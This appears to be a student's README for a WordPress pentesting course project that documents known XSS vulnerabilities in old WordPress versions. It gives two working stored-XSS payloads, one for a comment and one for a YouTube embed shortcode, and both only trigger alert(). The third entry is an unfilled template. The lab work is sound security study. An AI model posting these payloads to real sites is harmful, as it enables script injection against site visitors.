# Project 7 - WordPress Pentesting

Time spent: 10 hours spent in total

> Objective: Find, analyze, recreate, and document three vulnerabilities affecting an old version of WordPress

## Pentesting Report

1. (Required) XSS Vulnerability due to UTF8 tructed data
  - [x] Summary: 
    - Vulnerability types:XSS 
    - Tested in version:WP 4.2.4
    - Fixed in version: 4.3.1
  - [x] GIF Walkthrough: http://i.imgur.com/5i6YT7N.gif
  - [x] Steps to recreate: 
    - Copy and paste this payload and post it in the comment: <a title='x onmouseover=alert(unescape(/hello%20world/.source)) style=position:absolute;left:0;top:0;width:5000px;height:5000px  AAAAAAAAAAAA...[64 kb]..AAA'></a>
  - [ ] Affected source code:
2. (Required) WordPress  4.0-4.7.2 - Authenticated Stored Cross-Site Scripting (XSS) in YouTube URL Embeds
  - [x] Summary: 
    - Vulnerability types: XSS
    - Tested in version: 4.0-4.7.2
    - Fixed in version: 
  - [x] GIF Walkthrough:http://i.imgur.com/EIPLH79.gif 
  - [x] Steps to recreate: 
    - Copy and paste this payload into a new post: [embed src='https://youtube.com/embed/11111\x3csvg onload=alert(1)\x3e'][/embed]
  - [ ] Affected source code:
    - [Link 1](https://developer.wordpress.org/reference/functions/do_shortcode/)
    - [Link 2](https://developer.wordpress.org/reference/functions/wp_embed_register_handler/)
    - [Link 3](https://developer.wordpress.org/reference/classes/wp_embed/autoembed/)
3. (Required) Vulnerability Name or ID
  - [ ] Summary: 
    - Vulnerability types:
    - Tested in version:
    - Fixed in version: 
  - [ ] GIF Walkthrough: 
  - [ ] Steps to recreate: 
  - [ ] Affected source code:
    - [Link 1](https://core.trac.wordpress.org/browser/tags/version/src/source_file.php)


## Assets

List any additional assets, such as scripts or files

## Resources

- [WordPress Source Browser](https://core.trac.wordpress.org/browser/)
- [WordPress Developer Reference](https://developer.wordpress.org/reference/)

GIFs created with [LiceCap](http://www.cockos.com/licecap/).

## Notes

Describe any challenges encountered while doing the work

## License

    Copyright [yyyy] [name of copyright owner]

    Licensed under the Apache License, Version 2.0 (the "License");
    you may not use this file except in compliance with the License.
    You may obtain a copy of the License at

        http://www.apache.org/licenses/LICENSE-2.0

    Unless required by applicable law or agreed to in writing, software
    distributed under the License is distributed on an "AS IS" BASIS,
    WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
    See the License for the specific language governing permissions and
    limitations under the License.